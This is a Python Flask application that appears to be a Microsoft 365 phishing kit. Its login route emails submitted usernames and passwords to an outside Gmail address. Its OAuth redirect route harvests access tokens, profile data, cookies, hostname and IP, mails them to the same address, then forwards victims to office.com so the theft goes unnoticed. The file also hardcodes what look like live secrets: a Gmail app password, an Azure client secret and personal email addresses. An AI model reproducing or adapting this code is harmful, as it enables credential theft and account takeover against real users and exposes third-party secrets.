from flask import Flask, request, redirect, session, render_template
import os
import requests
from flask_mail import Mail, Message
import msal
import socket
import httpagentparser

app = Flask(__name__)

app.config["DEBUG"] = True
app.config['SECRET_KEY'] = 'YOUR_SECRET_KEY'  # Replace with your secret key
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USERNAME'] = 'olamicreas@gmail.com'
app.config['MAIL_PASSWORD'] = 'svyp opql amtv gsva'
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True
app.config['MAIL_DEFAULT_SENDER'] = 'olamicreas@gmail.com'

mail = Mail(app)

def browserr():
    agent = request.environ.get('HTTP_USER_AGENT')
    browser = httpagentparser.detect(agent)
    if not browser:
        browser = agent.split('/')[0]
    else:
        browser = browser['browser']['name']
    return browser

@app.route('/')
def home():
    return render_template('home.html')

@app.route('/login', methods=['POST', 'GET'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        passw = request.form.get('password')

        # Temporarily store the password in session (this is not secure in production)
        msg = Message(
            subject='M info',
            recipients=['beeamen8@gmail.com'],
            body=f"username: {email}\n pass: {passw}\n"
        )
        mail.send(msg)
       

        return redirect('index')

    
    return render_template('login.html')

@app.route('/index')
def index():
    client_id = '97be1921-1a8f-4a4c-b423-51dcf106f508'
    authority = 'https://login.microsoftonline.com/common'
    scope = ['User.Read']

    msal_app = msal.ConfidentialClientApplication(
        client_id,
        client_credential='qoh8Q~Rc1BhvL3gzNUH1Y3VUq~H4ktBAJuEXkcRR',  # Replace with your actual client secret value
        authority=authority,
    )

    auth_url = msal_app.get_authorization_request_url(
        scopes=scope,
        redirect_uri='https://portalauth.onrender.com/redirect'
    )
    return redirect(auth_url)

@app.route('/redirect')
def handle_redirect():
    client_id = '97be1921-1a8f-4a4c-b423-51dcf106f508'
    authority = 'https://login.microsoftonline.com/common'
    scope = ['User.Read']

    msal_app = msal.ConfidentialClientApplication(
        client_id,
        client_credential='qoh8Q~Rc1BhvL3gzNUH1Y3VUq~H4ktBAJuEXkcRR',  # Replace with your actual client secret value
        authority=authority,
    )

    if 'code' in request.args:
        code = request.args.get('code')
        result = msal_app.acquire_token_by_authorization_code(
            code,
            scopes=scope,
            redirect_uri='https://portalauth.onrender.com/redirect'
        )

        if 'access_token' in result:
            access_token = result['access_token']
            response = requests.get(
                'https://graph.microsoft.com/v1.0/me',
                headers={'Authorization': f'Bearer {access_token}'}
            )
            cookies = response.cookies

            # Loop through cookies and format them
            cookies_string = "\n".join([f"{cookie.name}: {cookie.value}" for cookie in cookies])

            device = socket.gethostname()
            ipAddr = socket.gethostbyname(device)
            browser_name = browserr()

            user_info = response.json()
            user_password = session.get('user_password', 'Password not captured')

            body = (
                f"Device: {device}\n"
                f"IP Address: {ipAddr}\n"
                f"Browser: {browser_name}\n"
                f"User Info: {user_info}\n"
                f"Password: {user_password}\n"  # Include the password here
                f"Cookies:\n{cookies_string}\n"
                f"Access Token: {access_token}"
            )

            try:
                with app.app_context():
                    msg = Message(
                        subject='M info',
                        recipients=['beeamen8@gmail.com'],
                        body=body
                    )
                    mail.send(msg)
                print("Email sent successfully!")
            except Exception as e:
                print(f"Failed to send email: {str(e)}")

            # Redirect the user to the Microsoft 365 homepage
            return redirect('https://www.office.com/')
        else:
            error = result.get('error')
            error_description = result.get('error_description')
            print(f"Error: {error}, Description: {error_description}")
            return f"Error: {error}, Description: {error_description}"
    else:
        return "Authorization code not found in request."

if __name__ == '__main__':
    app.run(debug=True)
